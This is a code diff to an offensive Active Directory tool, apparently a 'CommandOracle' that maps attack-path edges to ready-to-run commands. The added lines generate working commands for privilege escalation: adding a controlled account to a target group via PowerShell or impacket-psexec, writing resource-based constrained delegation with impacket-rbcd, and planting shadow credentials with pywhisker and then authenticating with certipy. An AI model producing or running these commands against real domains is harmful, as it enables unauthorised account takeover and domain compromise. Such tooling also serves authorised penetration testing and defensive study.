@@ -149,7 +149,7 @@ class CommandOracle:
             )
 
         # CanAddMember / AddMember
-        if normalized_edge in ("CanAddMember", "AddMember"):
+        if normalized_edge in ("CanAddMember", "AddMember", "AddMembers"):
             target_group = target.name or "<TARGET_GROUP>"
             if "\\" in target_group:
                 target_group = target_group.split("\\", maxsplit=1)[1]
@@ -159,8 +159,33 @@ class CommandOracle:
             member_to_add = "<MEMBER_TO_ADD>"
             target_host = "<TARGET_DOMAIN_CONTROLLER>"
             return (
+                "# AddMember: add controlled principal into target group\n"
+                f"powershell -c \"Add-DomainGroupMember -Identity '{target_group}' -Members '{member_to_add}'\"\n"
+                "# or classic net.exe flow\n"
                 f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
                 f"'net group \"{target_group}\" {member_to_add} /add /domain'"
+            )
+
+        # AddAllowedToAct / AllowedToAct (RBCD write primitive)
+        if normalized_edge in ("AddAllowedToAct", "AllowedToAct"):
+            target_computer = target.name or "<TARGET_COMPUTER>"
+            return (
+                "# AddAllowedToAct: configure RBCD on target computer object\n"
+                f"impacket-rbcd{auth_part} -dc-ip <DC_IP> -action write "
+                f"-delegate-from '<CONTROLLED_COMPUTER>$' -delegate-to '{target_computer}' "
+                f"{domain}/{username}\n"
+                "# Follow up with S4U (Rubeus/getST) using delegated machine account"
+            )
+
+        # AddKeyCredentialLink (Shadow Credentials)
+        if normalized_edge == "AddKeyCredentialLink":
+            target_principal = target.name or "<TARGET_PRINCIPAL>"
+            return (
+                "# AddKeyCredentialLink: shadow credentials via msDS-KeyCredentialLink\n"
+                f"pywhisker -d {domain} -u {username}{auth_part} "
+                f"--target '{target_principal}' --action add\n"
+                "# Then request TGT as target with PKINIT\n"
+                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
             )
 
         # AllExtendedRights
